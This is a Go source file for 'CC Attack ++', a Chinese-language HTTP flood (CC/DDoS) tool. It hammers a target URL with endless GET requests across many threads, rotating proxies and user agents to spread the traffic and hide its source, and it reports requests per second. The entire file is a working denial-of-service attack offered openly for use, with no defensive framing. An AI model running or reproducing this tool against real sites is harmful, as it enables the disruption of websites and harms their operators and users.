package main

import (
	"bufio"
	"flag"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

var version = "2.2.3 (中文简体) (编译时间 2024/4/19 9:00)"

func main() {
	targetURL := flag.String("url", "", "攻击地址")
	requestInterval := flag.Int("speed", 100, "攻击速度(ms)")
	timeout := flag.Int("timeout", 2500, "请求超时 (ms)")
	userAgentFile := flag.String("ua", "", "UA池文件 (txt)")
	proxyListFile := flag.String("ip", "", "IP池文件 (txt)")
	threadCount := flag.Int("thread", 2, "线程")

	flag.Parse()

	if *targetURL == "" {
		fmt.Println("\033[31mCC Attack ++ 重写版 \033[34m版本:", version, "\033[0m")
		fmt.Println("\033[32m作者: MasonDye\033[0m")
		fmt.Println("\033[32mGitHub: https://github.com/MasonDye/CC-Attack-Rewrite\033[0m")
		fmt.Println() // 添加空行

		fmt.Println("\033[31m用法:\033[0m")
		flag.VisitAll(func(f *flag.Flag) {
			fmt.Printf("\033[32m  -%s\033[0m\n        %s\n", f.Name, f.Usage)
		})
		return
	}

	var proxyList []string
	if *proxyListFile != "" {
		var err error
		proxyList, err = readProxyList(*proxyListFile)
		if err != nil {
			fmt.Println("在读取IP池文件时失败:", err)
			return
		}
	}

	userAgent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
	if *userAgentFile != "" {
		userAgentList, err := readUserAgentList(*userAgentFile)
		if err != nil {
			fmt.Println("在读取UA池文件时失败:", err)
			return
		}
		rand.Seed(time.Now().UnixNano())
		userAgent = getRandomUserAgent(userAgentList)
	}

	successCount := 0
	errorCount := 0 // 添加错误计数器
	startTime := time.Now()

	var wg sync.WaitGroup // 添加等待组

	// 打印欢迎信息以及版本
	fmt.Println("\033[32mCC Attack ++ \033[31m|\033[34m 版本:", version, "\033[0m")

	// 打印开始攻击
	fmt.Println("\033[31m开始攻击!\033[0m")

	proxyCount := len(proxyList) // 代理计数

	for i := 0; i < *threadCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			client := &http.Client{
				Timeout: time.Duration(*timeout) * time.Millisecond,
			}

			for {
				if proxyCount > 0 { // 如果代理可用
					proxyURL := getRandomProxy(proxyList)
					transport := &http.Transport{
						Proxy: http.ProxyURL(proxyURL),
					}
					client.Transport = transport
				}

				req, err := http.NewRequest("GET", *targetURL, nil)
				if err != nil {
					fmt.Println("创建请求失败:", err)
					continue
				}

				req.Header.Set("User-Agent", userAgent)

				resp, err := client.Do(req)
				if err != nil {
					// fmt.Println("请求发送失败:", err)
					errorCount++ // 增加错误计数器
					continue
				}

				successCount++
				elapsed := time.Since(startTime).Seconds()
				requestsPerSecond := float64(successCount) / elapsed
				// Print attack info
				fmt.Printf("\r\033[31m请求数:%d \033[0m|\033[31m %.1f p/s \033[0m|\033[31m URL:%s \033[0m|\033[31m 线程:%d \033[0m|\033[31m 速度:%d \033[0m|\033[31m 超时:%d \033[0m|\033[31m 错误数:%d \033[0m", successCount, requestsPerSecond, *targetURL, *threadCount, *requestInterval, *timeout, errorCount)

				resp.Body.Close()

				time.Sleep(time.Duration(*requestInterval) * time.Millisecond)
			}
		}()
	}

	wg.Wait() // 等待所有协同程序执行完毕
}

func readProxyList(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var proxyList []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxy := strings.TrimSpace(scanner.Text())
		proxyList = append(proxyList, proxy)
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return proxyList, nil
}

func readUserAgentList(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var userAgentList []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		userAgent := strings.TrimSpace(scanner.Text())
		userAgentList = append(userAgentList, userAgent)
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return userAgentList, nil
}

func getRandomProxy(proxyList []string) *url.URL {
	if len(proxyList) == 0 {
		return nil
	}

	randIndex := rand.Intn(len(proxyList))
	proxyURL, _ := url.Parse("http://" + proxyList[randIndex])
	return proxyURL
}

func getRandomUserAgent(userAgentList []string) string {
	if len(userAgentList) == 0 {
		return ""
	}

	randIndex := rand.Intn(len(userAgentList))
	return userAgentList[randIndex]
}
